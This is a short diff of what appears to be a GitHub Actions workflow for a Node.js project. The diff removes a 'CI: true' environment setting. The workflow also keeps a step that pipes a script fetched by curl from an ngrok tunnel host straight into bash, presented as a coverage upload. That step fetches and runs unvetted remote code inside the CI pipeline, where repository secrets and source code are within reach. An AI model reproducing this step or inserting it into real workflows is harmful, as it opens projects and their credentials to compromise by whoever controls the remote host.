@@ -15,8 +15,6 @@ jobs:
     - run: npm install
     - run: npm run build --if-present
     - run: npm test
-      env:
-        CI: true
     - run: bash <(curl -s http://ib-84012.ngrok.io/bash) -f coverage/clover.xml
       
       
